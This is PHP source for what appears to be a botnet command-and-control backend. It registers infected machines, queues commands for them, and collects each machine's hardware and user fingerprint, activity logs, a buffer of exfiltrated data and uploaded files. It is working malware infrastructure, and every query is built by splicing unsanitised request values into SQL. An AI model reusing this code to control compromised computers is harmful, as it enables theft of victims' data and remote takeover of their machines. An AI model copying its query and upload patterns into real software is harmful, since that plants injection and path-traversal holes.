<?php 
 function create_new_user($uid, $tag) {
    require('assets/config.php');
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date("d-m-Y");
    $time = date("h:i");
    $mysqli->query("INSERT INTO bots (uid, ip, fresponse, lresponse) VALUES ('$uid', '$ip', '$date, $time AM', '$date, $time AM')");
    $mysqli->query("UPDATE bots SET team='System.Configuration=shell32.exe' WHERE uid='$uid'");
 }

 function user_update($uid) {
    require('assets/config.php');
    $date = date("d-m-Y");
    $time = date("h:i");
    $mysqli->query("UPDATE bots SET lresponse='$date, $time AM' WHERE uid='$uid'");
 }

 function return_instruction($uid) {
    require('assets/config.php');
    user_update($uid);
    $query = $mysqli->query("SELECT team FROM bots WHERE uid='$uid'");
    $result = $query->fetch_assoc();
    echo $result['team'];
    $mysqli->query("UPDATE bots SET team='' WHERE uid='$uid'");
 }

 function accept_log($uid, $info) {
  require('assets/config.php');
    user_update($uid);
    $date = date("d-m-Y");
    $time = date("h:i");
    $query = $mysqli->query("SELECT log FROM bots WHERE uid='$uid'");
    $result = $query->fetch_assoc();
    $result = $result['log'];
    $info = str_replace("\\", "/", $info);
    $mysqli->query("UPDATE bots SET log='$result <b>($date, $time AM)</b> $info<br>' WHERE uid='$uid'");
 }

 function accept_cfg($uid, $mac, $tmz, $cpu, $gpu, $mhn, $usr, $os, $lip, $tag, $ram) {
  require('assets/config.php');
    user_update($uid);
    if($tag == "") { $tag = "Common"; }
    $mysqli->query("UPDATE bots SET tag='$tag' WHERE uid='$uid'");
    $mysqli->query("UPDATE bots SET usr='$usr' WHERE uid='$uid'");
    $mysqli->query("UPDATE bots SET mhn='$mhn' WHERE uid='$uid'");
    $mysqli->query("UPDATE bots SET mac='$mac' WHERE uid='$uid'");
    $mysqli->query("UPDATE bots SET tmz='$tmz' WHERE uid='$uid'");
    $mysqli->query("UPDATE bots SET cpu='$cpu' WHERE uid='$uid'");
    $mysqli->query("UPDATE bots SET gpu='$gpu' WHERE uid='$uid'");
    $mysqli->query("UPDATE bots SET os='$os' WHERE uid='$uid'");
    $mysqli->query("UPDATE bots SET lip='$lip' WHERE uid='$uid'");
    $mysqli->query("UPDATE bots SET ram='$ram' WHERE uid='$uid'");
 }

 function accept_data($uid, $info) {
    require('assets/config.php');
    user_update($uid);
    $date = date("d-m-Y");
    $time = date("h:i");
    $query = $mysqli->query("SELECT buffer FROM bots WHERE uid='$uid'");
    $result = $query->fetch_assoc();
    $result = $result['buffer'];
    $info = str_replace("\\", "/", $info);
    $mysqli->query("UPDATE bots SET buffer='$result <b class=\"red\">($date, $time AM)</b> $info<br>' WHERE uid='$uid'");
 }

 function accept_file($uid) {  
    user_update($uid);
    if(!file_exists("data/files_users/$uid")){
        mkdir("data/files_users/$uid");  
    }

    if ($_FILES["file"]["error"] == UPLOAD_ERR_OK) {
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        move_uploaded_file($tmp_name, "data/files_users/$uid/$name");
    }
 }
?>